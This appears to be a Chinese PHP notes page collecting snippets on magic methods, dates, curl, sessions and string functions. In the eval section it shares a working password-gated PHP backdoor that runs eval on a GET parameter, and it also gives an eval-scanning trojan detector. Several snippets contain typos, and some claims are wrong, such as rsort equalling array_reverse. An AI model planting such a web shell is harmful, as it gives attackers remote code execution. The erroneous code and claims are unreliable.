在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）。从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。  
8、__sleep、__wakeup  
__sleep 串行化的时候用  
__wakeup 反串行化的时候调用  
serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。  
使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。  
相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。  
使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。  
9、__set_state  
当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。  
本方法的唯一参数是一个数组，其中包含按array(’property’ => value, …)格式排列的类属性。  
10、__invoke  
当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。  
PHP5.3.0以上版本有效  
11、__callStatic  
它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，  
PHP5.3.0以上版本有效  
PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此  

使用POSIX兼容规则的函数有：  
ereg_replace()  
ereg()  
eregi()  
eregi_replace()  
split()  
spliti()  
sql_regcase()  
mb_ereg_match()  
mb_ereg_replace()  
mb_ereg_search_getpos()  
mb_ereg_search_getregs()  
mb_ereg_search_init()  
mb_ereg_search_pos()  
mb_ereg_search_regs()  
mb_ereg_search_setpos()  
mb_ereg_search()  
mb_ereg()  
mb_eregi_replace()  
mb_eregi()  
mb_regex_encoding()  
mb_regex_set_options()  
mb_split()  
  
使用PERL兼容规则的函数有：  
preg_grep()  
preg_replace_callback()  
preg_match_all()  
preg_match()  
preg_quote()  
preg_split()  
preg_replace()  


+++++++json_encode()与json_decode()++++++++
<?php   
$json = '{"a":"php","b":"mysql","c":3}';  
$json_Class=json_decode($json);   
$json_Array=json_decode($json, true);   
print_r($json_Class);   
print_r($json_Array);   
?>
程序输出：
   stdClass Object ( 
    [a] => php 
    [b] => mysql 
    [c] => 3 ) 
    Array ( 
    [a] => php 
    [b] => mysql 
    [c] => 3 )  
在上面代码的前提下,访问对象类型$json_Class的a的值

echo $json_Class->{'a'};     //看这里，两者访问方法不一样
        程序输出：php
 访问数组类型$json_Array的a的值
echo $json_Array['a'];       //看这里，两者访问方法不一样
        程序输出：php   


++++++sleep()函数++++++死循环
无限执行程序，容易导致浏览器或电脑崩溃哟
ignore_user_abort();//关闭浏览器后，继续执行php代码
set_time_limit(0); //程序执行时间无限制
$intval=60; 
   do{
     $msg=date("Y-m-d H:i:s");
     echo date('Y-m-d H:i:s',time());
     file_put_contents("log.log",$msg,FILE_APPEND);//记录日志
    sleep($interval);//等待时间，进行下一次操作。
	
  }while(true);


+++++flush()与ob_flush()函数+++++++
实现php定时执行功能。
header("Content-Type: text/html");
set_time_limit(0);
$infoString = "Hello World";
while( isset($infoString) )
{
echo $infoString;
flush();  //把不在缓冲中的或者说是被释放出来的数据发送到浏览器
ob_flush(); //把数据从PHP的缓冲中释放出来，必须配合flush()使用
sleep(5);
}


++++个人电脑文件目录变更日志小程序+++++
实现功能：
实现子文件的文件读取，只写了两级，多级的话循环调就可以了
文件目录生成（使用序列化的格式，可以当作文件日志，当然你可以可以生成好看的排版格式）
文件变更对比，（本以为使用array_diff很容易实现，结果不知道返回值总是空，蛋疼，希望高手尝试一下）

<?php
/*扫描指定目录下文件 返回数组
 
*/
    function mydir($dir){
        $myfile = scandir($dir,1);
        foreach($myfile as $k=>$v){
         
        if(is_dir($dir."/".$v)==true&&$dir."/".$v !=$dir."/"."."&&$dir."/".$v !=$dir."/".".."){
            $sondir = $dir."/".$v;
            $sonfile = scandir($sondir);
             
            foreach($sonfile as $kk=>$vv)
            $result[$k][$kk]['filename'] = $vv;
            // $result[$k][$kk]['filesize'] = filesize($vv);//文件大小 单位字节
            $result[$k][$kk]['filectime'] = date("Y-m-d H:i:s",filectime($sondir."/".$vv));
            $result[$k][$kk]['fileatime'] = date("Y-m-d H:i:s",fileatime($sondir."/".$vv));//上次访问时间
        }else{
            $result[$k]['filename'] = $v;//文件名称
            // $result[$k]['filesize'] = filesize($v);//文件大小 单位字节
            // $result[$k]['fileowner'] = fileowner($v);//文件属于者         
            $result[$k]['filectime'] = date("Y-m-d H:i:s",filectime($dir."/".$v));//创建时间
            $result[$k]['fileatime'] = date("Y-m-d H:i:s",fileatime($dir."/".$v));//上次访问时间
        }
         
    }
        return $result;
     
    }
    //测试
    $mydir = mydir("F:\电影\Youku视频");
     
    $array = serialize($mydir);//序列化存储
    $fp = fopen("data.txt","a");//每次变化都追加到文件尾端写入（相当于日志）
    if(fwrite($fp,$array)){
        echo "文件日志生成ok";
        fclose($fp);
    }

++++PHP判断远程url是否有效的几种方法+++++

<?php 
$url = "http://cn.php.net/images/php.gif"; 
$array = get_headers($url,1); 
if(preg_match('/200/',$array[0])){ 
    echo "<pre/>"; 
    print_r($array); 
}else{ 
    echo "无效url资源！"; 
}

++++php判断是不是周末是不是工作日+++++
echo ( date('w') == 0 || date('w') == 6 ) ? '是周末' : '不是周末';


+++++php最完整时间日期星期年月日+++++
echo date("Y-m-d",strtotime("now")), "<br />";
echo date("Y-m-d",strtotime("-1 week Monday")), "离现在最近的周一<br />"; //离现在最近的周一
echo date("Y-m-d",strtotime("-1 week Sunday")), "离现在最近的周末<br />"; //离现在最近的周末
echo date("Y-m-d",strtotime("+0 week Monday")), "将要到来的周一<br />"; //将要到来的周一
echo date("Y-m-d",strtotime("+0 week Sunday")), "将要到来的周末<br />"; //将要到来的周末
echo date("n").'第几个月<br>';// 第几个月
echo date("w").'本周周几<br>';//本周周几
echo date("t").'本月天数<br>';// 本月天数
echo "<br />上周:<br />";
echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m"),date("d")-date("w")+1-7,date("Y"))),"<br />";
echo date("Y-m-d H:i:s",mktime(23,59,59,date("m"),date("d")-date("w")+7-7,date("Y"))),"<br />";
echo "<br>本周:<br>";
echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m"),date("d")-date("w")+1,date("Y"))),"<br />";
echo date("Y-m-d H:i:s",mktime(23,59,59,date("m"),date("d")-date("w")+7,date("Y"))),"<br />";
echo "<br>上月:<br>";
echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m")-1,1,date("Y"))),"<br />";
echo date("Y-m-d H:i:s",mktime(23,59,59,date("m") ,0,date("Y"))),"<br />";
echo "<br>本月:<br>";
echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m"),1,date("Y"))),"<br />";
echo date("Y-m-d H:i:s",mktime(23,59,59,date("m"),date("t"),date("Y"))),"<br />";
$getMonthDays = date("t",mktime(0, 0 , 0,date("n")+(date("n")-1)%3,1,date("Y")));//本季度未最后一月天数
echo "<br>本季度:<br>";
echo date('Y-m-d H:i:s', mktime(0, 0, 0,date('n')-(date('n')-1)%3,1,date('Y'))),"<br />";
echo date('Y-m-d H:i:s', mktime(23,59,59,date('n')+(date('n')-1)%3,$getMonthDays,date('Y'))),"<br />";
$jdtoday = gregoriantojd(date('n'), date('j'), date('y'));
$offset = jddayofweek($jdtoday)-1;
for($i=0-$offset; $i<7-$offset; $i++){
    $date = strtotime($i.' days');
    echo('<th>'.date('D', $date).'/'.date('n-j', $date).'</th>');
}
+++++本月月初月末的详细时间，距离此时此刻+++++
$y=date("Y",time());
$m=date("m",time());
$d=date("d",time());
$t0=date('t'); // 本月一共有几天
$t1=mktime(0,0,0,$m,1,$y); // 创建本月开始时间
$t2=mktime(23,59,59,$m,$t0,$y); // 创建本月结束时间
echo "今天时间\t".date("Y-m-d",time());
echo "本月开始\t".date("Y-m-d H:i:s",$t1);
echo "本月结束\t".date("Y-m-d H:i:s",$t2);
echo "时间差：";
echo $t2-$t1;

++++mb_substr()与mb_strcut()切割带有中文字符串的表现+++++++
<?php
echo mb_substr('这样一来我的字符串就不会有乱码^_^', 0, 7, 'utf-8');
?>
输出：这样一来我的字
<?php
echo mb_strcut('这样一来我的字符串就不会有乱码^_^', 0, 7, 'utf-8');
?>
输出：这样


+++php获取服务器详细信息++++++
获取系统类型及版本号：php_uname()(例：Windows&nbsp;NT&nbsp;COMPUTER&nbsp;5.1&nbsp;build&nbsp;2600)
只获取系统类型：php_uname('s')  (或：PHP_OS，例：Windows&nbsp;NT)
只获取系统版本号：;php_uname('r')&nbsp;&nbsp;(例：5.1)
获取PHP运行方式：php_sapi_name()&nbsp;(PHP&nbsp;run&nbsp;mode：apache2handler)
获取前进程用户名：Get_Current_User()
获取PHP版本：;PHP_VERSION
获取PHP安装路径：;DEFAULT_INCLUDE_PATH
获取当前文件绝对路径：p;__FILE__
获取Http请求中Host值：;$_SERVER["HTTP_HOST"];(返回值为域名或IP)
获取服务器IP:GetHostByName($_SERVER['SERVER_NAME'])
接受请求的服务器IP：$_SERVER["SERVER_ADDR"](有时候获取不到，推荐用：GetHostByName($_SERVER['SERVER_NAME']))
获取客户端IP：$_SERVER['REMOTE_ADDR']
获取服务器解译引擎：$_SERVER['SERVER_SOFTWARE']
获取服务器CPU数量：$_SERVER['PROCESSOR_IDENTIFIER']
获取服务器系统目录：$_SERVER['SystemRoot']
获取服务器域名：$_SERVER['SERVER_NAME'](建议使用：$_SERVER["HTTP_HOST"])
获取用户域名：$_SERVER['USERDOMAIN']
获取服务器语言：$_SERVER['HTTP_ACCEPT_LANGUAGE']
获取服务器Web端口：$_SERVER['SERVER_PORT']


+++++每个程序员都应该知道的 15 个最佳 PHP 库++++
15个最佳的PHP库，它们将帮助网站开发人员轻松提高网站的功能，优化PHP的开发时间。
1. PChart
PChart是一个令人印象深刻的PHP库，可以以一种可视化图表的形式生成文本数据。数据可以展示为柱状图，
饼状图，以及其他格式。使用SQL查询可以帮助PHP脚本创建令人惊叹的图表和图形。
2. PHP CAPTCHA
PHP CAPTCHA是另一个伟大的用于创建自动化音频和可视化CAPTCHA的PHP库。CAPTCHA系统是完全自动的使用图灵测试
来完成区分人和机器人的挑战。 PHP库需要PHP 4以及编译的FreeType文本和GD 1或2图像生成的支持。
3.Dispatch
Dispatch是一个简单的PHP库，可以定义URL规则以更好地组织网站。使用这个PHP库你可以匹配HTTP路径和要求，
显示器等的特定类型。结合Dispatch和本文中列出的其他库，开发人员就能有一个强大而简单的工作设置。
4. Services_JSON
Services_JSON允许人脑可读数据的传输。 PHP库的最新版本为服务器传输数据提供了极大的便捷。
5. phpAES
phpAES是支持128，192和256位AES加密密码的一类实现PHP代码。当涉及到汇编成PHP的时候，你不需要其他的扩展。
phpAES是全功能的，并且符合FIPS 197。
6. ImageWorkshop
ImageWorkshop是一个伟大的开源PHP库，允许你层次化地控制操作图像。使用PHP库，你可以裁剪、调整大小、添加水印、
制作缩略图等以不同的方式处理图像。 PHP库还可以更容易地进一步加强在web网站上所使用的图像。
7.Mink
Mink是另一个有用的PHP库，可以帮助你用互联网浏览器测试web页面的交互。该库删除了不同浏览器之间的API的差异，
从而给开发人员提供更好的测试环境。
8. PHP Thumbnailer
PHP Thumbnailer是一个简单的图像处理PHP库，能够帮助生成缩略图。此库不需要再安装外部库。PHP Thumbnailer提供了
对缩略图的多种控制，如根据高度、宽度、百分比调整缩略图大小，旋转图像，以及创建自定义的小图形，如正方形。
9.Hoa
Hoa是结构化，模块化，可扩展的PHP库，可创建研究和工业领域之间的链接。 此PHP库建议必不可少的范式、机制、算法，
以确保web站点的可靠性。
10. PHP Text to Image
PHP Text to Image是一个可以将文本转换成图像的PHP库。在某些简单的情况下，如显示email地址作为不能以编程方式发现
的图像的时候，这是很有用的。使用这个PHP库可以通过网络爬虫以及将它当作垃圾邮件来减少电子邮件地址泛滥。
11.Faker
Faker是一个非常有用的PHP库，可以在需要时创建假数据。使用这个PHP库，你可以执行各种诸如匿名数据，引导数据库，
创建XML文档，进行压力测试的任务。
12.PHP Image Upload Class
PHP Image Upload Class是一个功能强大的PHP库，可以简化上传图像到窗体表格的过程。通过这个库，
开发人员可以使用文件输入命令上传图片。开发人员也可以在类之外定义用户消息，通过gettext或类似的命令，在本地提供帮助。
13.Ratchet
使用Ratchet PHP库，web开发人员可以创建实时性以及在客户端和服务器之间双向性的应用程序。 这个PHP库能够帮助促进和
创造事件驱动应用程序，而不是使用传统的HTTP请求。
14. PHP Export XLS Class
PHP Export XLS Class是一个轻量级的，快速又简单的PHP库，可以导出不同类型的数据到Excel中。它可以转换各种数据格式
到.xls格式。此库还可工作于多个工作表，元数据（标题，作者，描述，等），不同的字体类型和风格，填充，单元格边框
和渐变。开发人员也可以使用PHP扩展来添加图像到工作表中。
15. phpDocumentor
phpDocumentor是一个很不错的自动文档工具，可以帮助我们创建一个使用PHP代码的专业文档。 该PHP库支持添加多种
不同的功能到网站。一些由PHP库支持的增值功能，包括支持合并自定义文档——例如教程，链接文档，创建高亮源代码，
功能交叉引用到PHP常规文档。 此PHP库可以帮助自动化文档。
16. PHP DB Class
PHP DB Class是一个伟大的PHP库，可以帮助开发PHP和MySQL。该工具可轻松方便地访问一个数据库，并减少执行任务所
需的代码数量。此外，此PHP库提供各种调试功能。例如，开发人员可以使用调试功能来显示请求和结果表，还可以通过
添加参数到它的类的方法来执行此任务。


{}大括号就是告诉PHP，括起来的部分要当成变量处理。如下例子：
<?php
$array=array('www','name'=>'phpernote','com');
echo "$array['name']";//用此句会报语法错误
echo "{$array['name']}";//此句正常，大括号内的字符将作为变量来处理


++++php字符串处理函数+++++
convert_uudecode — 解密一个字符串
convert_uuencode — 加密一个字符串
base64_encode: 将字符串以 BASE64 加密。 
base64_decode: 将 BASE64 编码字符串解密。 
str_rot13 — ROT13加密
str_rot13(str_rot13())-对str_rot13()解密
crypt()- 单向加密算法
md5()-不可逆散列
md5_file — 将一个文件进行MD5算法加密，不可逆的散列
sha1 — 将一个字符串进行SHA1算法加密，不可逆的散列
sha1_file — 将一个文件进行SHA1算法加密，不可逆的散列
str_word_count — 获取字符串里面的英文段落的个数
strip_tags — 去除一个字符串里面的HTML和PHP代码
addslashes — 用指定的方式对字符串里面的字符进行转义
addcslashes — 为字符串里面的部分字符添加反斜线转义字符
stripcslashes — 反转义addcslashes()函数转义处理过的字符串


+++++php定时跳转+++++
header("refresh:3;url=http://www.qq.com");
echo '正在加载，请稍等...<br>三秒后自动跳转';


++++ip2long()、long2ip()、checkdnsrr()、highlight_file()+++++
使用 ip2long() 和 long2ip() 函数来把 IP 地址转化成整型存储到数据库里。
在验证 email 地址的时候使用 checkdnsrr() 函数验证域名是否存在。
用 highlight_file('文件名') 来自动的打印出格式化的很漂亮的源代码.


++++php数组以键值重组新数组+++++
$reszz=M()->query("
select lxtel,id from ks_seller where lxtel in(
select lxtel from ks_preheat_remind where lxtel in( select lxtel from ks_seller) )
");
foreach($reszz as $k=>$v){
$kkk[$v['lxtel']].=$v['id'];
}


++++PHP左边用0填充补齐生成类似学号++++
<?php
	$num = 3;
	$bit = 7;//产生7位数的数字编号
	$num_len = strlen($num);
	$zero = '';
	for($i=$num_len; $i<$bit; $i++){
		$zero .= "0";
	}
	$real_num = "d".$zero.$num;
	echo $real_num;
?>


++++$_SERVER[‘REQUEST_TIME’]+++++
想知道脚本开始执行(译注：即服务器端收到客户端请求)的时刻，使用$_SERVER[‘REQUEST_TIME’]要好于time()。
echo "referer: " . $_SERVER["HTTP_REFERER"];PHP生成地址栏链接地址
显示所有为本版本PHP做出贡献的人的名单
echo phpcredits();

++PHP处理url+++++++
parse_url: 解析 URL 字符串。 
urldecode: 还原 URL 编码字符串。 
urlencode: 将字符串以 URL 编码。 



+++++PHP获取多个同名复选框的值的处理(完整正确版本)多选框的处理程序前台后台++++++
要获取同名的多个复选项框的值的时候,而且复选框的个数是不确定的,PHP和ASP的处理不同.ASP的REQUEST能将获取的复选框自动形成一个数组,要处理这些数值就很容易.比起ASP,PHP就麻烦些,它并没有这些功能(至少我目前未找到).
所以,处理这个问题的时候,我们可以通过JAVASCRIPT预处理,在点击提交的时候把这些复选框的值附加到一个隐藏域去,然后PHP可以获取到这个隐藏域的值,通过explode()函数分解为数组,这样就可以批量获得复选框的值了.
程序代码： 
<html>
<body>
<form name="form3" id="form1" action="getvalues.php" method="post">
   <input type="checkbox" name="checkbox1" value="1"><br>
   <input type="checkbox" name="checkbox1" value="2"><br>
   <input type="checkbox" name="checkbox1" value="3"><br>
   <input type="checkbox" name="checkbox1" value="4"><br>
   <input name="allcheckboxs" type="hidden" value=""><br>     <!--隐藏域,JS将会把值加在allcheckboxs-->
  <input type="submit" name="Submit3" value="提交" onClick="return allcheckbox();">  <!--提交时会激活checkbox()函数-->
</form>

<script language="javascript">
function allcheckbox() 
{ 
   
　form3.allcheckboxs.value = ""; 
　if ( !form3.checkbox1.length ) // 只有一个复选框，form3.checkbox1.length = undefined 
　{ 
　　if ( form3.checkbox1.checked ) 
　　　form3.allcheckboxs.value = form3.checkbox1.value; 
　} 
　else 
　{ 
　　for ( i = 0 ; i < form3.checkbox1.length ; i++ ) 
　　{ 
　　　if ( form3.checkbox1(i).checked ) // 复选框中有选中的框 
　　　{ 
　　　　form3.allcheckboxs.value = form3.checkbox1(i).value; 
　　　　for ( j = i + 1 ; j < form3.checkbox1.length ; j++ ) 
　　　　{ 
　　　　　if ( form3.checkbox1(j).checked ) 
　　　　　{ 
　　　　　　form3.allcheckboxs.value += ","; //用,做分割符 
　　　　　　form3.allcheckboxs.value += form3.checkbox1(j).value; 
　　　　　} 
　　　　} 
　　　　break; 
　　　} 
　　} 
　} 
　return true; 
}

</script>
</body>
</html>

下面是处理程序代码：
getvalues.php

<?php
if ((isset($_POST["allcheckboxs"])) && ($_POST["allcheckboxs"] != "")) {
 $allcheckboxs_val= explode(",", $_POST["allcheckboxs"]); 
  for ($i=0;$i<count($allcheckboxs_val);$i++){
     echo $allcheckboxs_val[$i]."<br>";//arhwen.com
}
}
?>


++++PHP百分数转小数++++
$a = "20.544545%";  
echo (float)$a/100;


++++PHP中pack()和unpack()函数++++
pack 对应的还有个函数为 unpack ，用于压缩二进制串，能减少串存储空间。
$pass_hash = pack("H*", md5("my-password"));
echo $pass_hash;

+++++cal_days_in_month() 函数+++++
cal_days_in_month() 函数针对指定的年份和日历，返回一个月中的天数。
语法：cal_days_in_month(calendar,month,year)。
案例：
$days = cal_days_in_month(CAL_GREGORIAN, 2, 2015); 
echo $days;

++gettext()也就是_()+++++
利用gettext实现多国语系支持！
搭建环境
1，首先查看你的php扩展目录下是否有php_gettext.dll这个文件，如果没有，这就需要你下载一个或是从其他地方拷贝一个，然后放到php扩展目录。
2，打开php.ini，查找”;extension=php_gettext.dll“ ，然后去除注释，重启apache。
步骤二:原理讲解
假如你的没有国际化的程序里有这样的代码，echo "你好";,而国际化的程序你要写成 echo gettext("你好");，然后再在配置文件里添加“你好”相对应的英文“Hi”。
步骤三：编码测试
 <?php 
$domain = 'test';
bindtextdomain($domain, "locale/");//设置某个域的mo文件路径
textdomain($domain);//设置gettext()函数从哪个域去找mo文件
echo gettext("Hi!");//_()是gettext()函数的简写形式
步骤四：配置文件的生成
太多，见http://www.cnblogs.com/lost-1987/articles/3309693.html

+++natsort()++
PHP自然排序，类似与ksort() sort()等等

+++global()+++++取出目录中的特定文件
foreach (glob("*.php") as $file) {
    echo "$file<br>";
}


++++查看系统默认支持什么函数+++++
$arr = get_defined_functions(); 
Function php() {
}
echo   "<pre>"; 
Echo   "这里显示系统所支持的所有函数,和自定以函数phpn";
print_r($arr); 
echo   "</pre>"; 

+++使Html/PHP格式的字符串不被解释,而是照原样显示++++
$str="<h1>PHP</h1>";
echo "被解释过的: ".$str."<br>经过处理的:";
echo   htmlentities(nl2br($str));

$_SERVER['DOCUMENT_ROOT'];运行脚本的文档根目录
$_SERVER['HTTP_HOST']; 头部的内容
$_SERVER['HTTP_REFERER'];前一个页面的IP
求3个值中最大值得函数：
function maxmun($a,$b,$c){
	return $a>$b?($a>$c?$a:$c):($b>$c?$b:$c);
}
POST传输的最大容量默认是8M;
GET是2kb;

对字符进行编码，保证编码可逆：
$a='hello';
$b="world";
$a=base64_encode($a);
$b=base64_encode($b);
$a=$a.'&'.$b;
$b=explode('&',$a);
$a=base64_decode($b[1]);
$b=base64_decode($b[0]);
echo $a,$b;


1234567890转换成1,234,567,890.
$str='1234567890';
function str($str){
	$str=strrev($str);
	$str=chunk_split($str,3,',');
	$str=strrev($str);
	$str=ltrim($str,',');
	return $str;
}

如何实现字符串翻转。(strtev会报错)
function strrev_utf8($str){
	return join("",array_reverse(preg_split("//u",$str)));
}

var_dump(in_array('01',array('1'))); //boolean true
var_dump('01' == 1);  //boolean true

strcasecmp() 函数比较两个字符串。
strcasecmp() 函数是二进制安全的，且不区分大小写。
echo strcasecmp('1222','1233');   //若相等返回0，反之自己猜

将09转换成十进制数字
echo decbin('09');

array_map() 函数返回用户自定义函数作用后的数组。回调函数接受的参数数目应该和传递给 array_map() 函数的数.
这个绝对好用,可以对数组中每一个值进行操作。
$arr=array('hello','world');
$arr=array_map('ucfirst',$arr);
var_dump($arr);
Hello World

rsort()与array_reverse()效果相同。使数组元素顺序调换。

输出当前北京时间，不用考虑转换。绝对标准。
date_default_timezone_set("PRC");
echo date("Y-m-d H:i:s",time());

计算某字符串中某个字符出现的次数：
echo substr_count('tbsbstbbsrb','t');

array_unshift将元素添加到数组开头。
$arrr=array('james','tom','symfony');
array_unshift($arrr,'jack');
var_dump($arrr);

$arrr=array('james','tom','symfony');
1.如果没有指定个数，则返回随机的键名，0啊，1啊，2啊，或者其他
$randvalue=array_rand($arrr);
var_dump($randvalue);
结果肯是：
int 1 
1.指定了个数，则返回随机数组
$randvalue=array_rand($arrr，2);
var_dump($randvalue);
结果可能是：
array (size=2)
  0 => int 1
  1 => int 3


<?php
class a{
function __construct(){
	echo 'a ';
	}
}
class b extents a{

	function __construct(){
		echo 'b';
	}
}
$a =new b();
会输出：
b
分析：
类b继承自类a，两个类都定义了构造函数，由于二者名字相同，所有子类中的构造函数
覆盖了父类的构造函数，要想子类对象也执行父类的构造函数，需要在子类构造函数中使用parent::__construct()来调用父类构造函数。

++++读取网页内容++++
$res=fopen('http://www.qq.com','rb');
$contents=stream_get_contents($res);
fclose($res);
echo $contents;
上面的就等于
echo file_get_contents('http://www.qq.com');

解释下面正则的意思：
((^\s*)|(\s*$))
匹配以0个或多个空白符开头或者0个或者多个空白符结尾的字符串。


++++修改session生存时间+++++
1.将php.ini中的session.gc_maxlifttime设置为9999重启Apache；
2.
$savePath='./session_save_dir/';
$lifeTime=3600;
session_save_path($savePath);
session_set_cookie_params($lifeTime);
seesion_start();
3.
session_start();
$lifeTime=3600; //1分钟
setCookie(session_name(),session_id(),time()+$lifeTime,'/');


//设置一个cookie的名字为username，值为jack,一周后失效，
setcookie('username','jack',time()+7*24*3600);


七层网络模型名称：
物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。


++PHP中eval()函数++++++
eval("echo 'hello world';");
等同于下面的代码：
echo "hello world";
在浏览器中输出：hello world;
注意点：
1.eval函数的参数的字符串末尾一定要有分号，在最后还要另加一个分号（这个分号是php限制）
2.注意单引号，双引号和反斜杠的运用。如果参数中带有变量时,并且变量有赋值操作的话，
变量前的$符号钱一定要有\来转义。如果没有赋值操作可以不需要。
分享个php eval后门程序：
使用方法
http://url/test.php?pwd=admin&action=eval&a=phpinfo();
代码如下：
<?php
$passwd="admin";if($_GET['pwd']!=$passwd)exit;
if($_GET['action']=="eval" && $_GET['a']){eval($_GET['a']);}
?>


+++++PHP检测木马程序+++++++
function parAllFiles($d)
{
    $dh = dir($d);
    while($filename = $dh->read() )
    {
        if($filename=='.' || $filename=='..') continue;
        $tfile = $d.'/'.$filename;
        if(is_dir($tfile))
        {
            //echo "检查到： $tfile ";
            parAllFiles($tfile);
        }
        else
        {
            if(!ereg("\.php", $tfile)) continue;
            $bd = file_get_contents($tfile);
            if(eregi("eval\(", $bd))
            {
                echo "$tfile\r\n";
            }
        }
    }
}
parAllFiles(dirname(__FILE__));


++++str_pad()函数+++++
str_pad()函数把字符串填充为指定的长度。
str_pad(string,length,pad_string,pad_type)
pad_type:
STR_PAD_BOTH，填充到字符串两头；
STR_PAD_LEFT;填充到左边；
STR_PAD_RIGHT;填充到右边。
$str="Hello world";
echo str_pad($str,20,'..');


+++flush()函数++++
 //会每隔1s输出一个数字，但是使用ob_flush()会等待5s一起输出
 echo str_repeat("-",60);
	for($i=0;$i<5;$i++){
		echo $i;	
		sleep(1);
		flush();
	}
    

++pack与unpack+++
echo pack("C*",80,72,80);


++++parse_str()函数+++++++
把查询字符串解析到变量中。
parse_str("name=bob&age=33");
echo $name.'--'$age.'<br>';
parse_str('name=bob&age=55',$myarray);
print_r($myarray);


+++++php信息安全处理+++++++
//对输入信息进行安全处理
$value=(!get_magic_quotes_gpc())?addslashes($value):$value;
//对取出数据进行显示还原
function check)input($value){
	if(get_magic_quotes_gpc()){
		$value=stripslashes($value);
	}
	//使用本函数预防数据库攻击
	if(!is_numeric($value)){
		$value="'".mysql_real_escape_string($value)."'";
	}
	return $value;
}


++PHP判断服务器类型++++
echo PHP_SAPI;
//结果为fpm-fcgi,使用nginx + php-fpm ；结果为cgi-fcgi,使用nginx + fastcgi；结果为apache2handler,使用apache；结果为cli,直接使用终端的php命令解析。


++++curl++++++
cURL可以使用URL的语法模拟浏览器来传输数据，
因为它是模拟浏览器，因此它同样支持多种协议，
FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP等协议都可以很好的支持，包括一些：
HTTPS认证，HTTP POST方法，HTTP PUT方法，FTP上传，keyberos认证，HTTP上传，代理服务器，cookies，用户名/密码认证，
下载文件断点续传，上传文件断点续传，http代理服务器管道，甚至它还支持IPv6，scoket5代理服务器，通过http代理服务器上传文件
到FTP服务器等等。
这就是我们为什么要使用cURL的原因！
curl的工作就是通过http协议发送这些message 
现在再看代码，实际上代码只做了五件事情
curl_init()初始化curl
curl_setopt()设置传输数据和参数
curl_exec()执行传输并获取返回数据
curl_errono()返回错误码
curl_close()关闭curl
curl使用get方法抓取任意页面的内容：
 header("content-type:text/html;charset=utf8");
    //初始化
    $curl = curl_init();
    //设置url
    curl_setopt($curl, CURLOPT_URL, 'http://www.qq.com');
    //设置返回获取的输出为文本流
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    //执行命令
    $data = curl_exec($curl);
    //关闭URL请求
    curl_close($curl);
    //显示获得的数据
    print_r($data);
实例：
//短信验证码功能
$post_data=array();
$post_data['code']=验证短信提供商提供的账号；
$post_data['passw']=账号对应的密码；//$password
$post_data['content']="发送短信的内容";//$content
$post_data['destMoblies']=$send_tel;//需要发送的手机号码
$post_data['sign']=md5(urlencode($content.$password));
$post_data['sp_code']=$sp_code;
$url="http://...:8080/";
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_HEADER,0);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); //将curl_exec()获取的信息以文件流的形式返回，而不是直接输出
curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,5);  //发起连接前等待时间，如果为0，则无限等待
curl_setopt($ch,CURLOPT_COOKIEJAR,'cookie.txt');  //链接结束后保存cookie信息文件
curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data);//如果value是一个数组，Content-Type头将会被设置成multipart/form-data
$result=curl_exec($ch);
$result=urldecode($result);


+++PHP随机密码算法（安全性可以）+++++
随机生成密码并且计算其所用的时间。
function create_pwd($pwd_length=8){
	$randpwd="";
	for($i=0;$i<$pwd_length;$i++){
		$randpwd .=chr(mt_rand(33,126));
	}
	return $randpwd;
}
function getmicrotime(){
	list($usec,$sec)=explode(" ",microtime());
	return (float)$usec+(float)$sec;
}
$time_start=getmicrotime();
$pwd=create_pwd('14');
echo $pwd;
$time_end=getmicrotime();
$time=$time_end-$time_start;
echo "<br>执行时间$time seconds";


++++函数list用法++++++
list的作用是将数组中的元素转换成对象.
$arr=array(1,2,3);
list($a,$b,$c)=$arr;
echo "我的年龄是$a,$b,$c";
结果是：我的年龄是1,2,3 



++++PHP生成唯一的激活码++++++
//生成唯一的激活码
function create_guid($namespace = null) {  
    static $guid = '';  
    $uid = uniqid ( "", true );    
    $data = $namespace;  
    $data .= $_SERVER ['REQUEST_TIME'];     // 请求那一刻的时间戳  
    $data .= $_SERVER ['HTTP_USER_AGENT'];  // 获取访问者在用什么操作系统  
    $data .= $_SERVER ['SERVER_ADDR'];      // 服务器IP  
    $data .= $_SERVER ['SERVER_PORT'];      // 端口号  
    $data .= $_SERVER ['REMOTE_ADDR'];      // 远程IP  
    $data .= $_SERVER ['REMOTE_PORT'];      // 端口信息      
    $hash = strtoupper ( hash ( 'ripemd128', $uid . $guid . md5 ( $data ) ) );  
    $guid = '{' . substr ( $hash, 0, 8 ) . '-' . substr ( $hash, 8, 4 ) . '-' . substr ( $hash, 12, 4 ) . '-' . substr ( $hash, 16, 4 ) . '-' . substr ( $hash, 20, 12 ) . '}';  
    return $guid;  
}  
//使用  
echo $key = create_guid ();  

+++PHP检测网络是否可用+++++
function varify_url($url){  
$check = @fopen($url,"r");  
if($check){  
 $status = true;  
}else{  
 $status = false;  
}    
return $status;  
}  
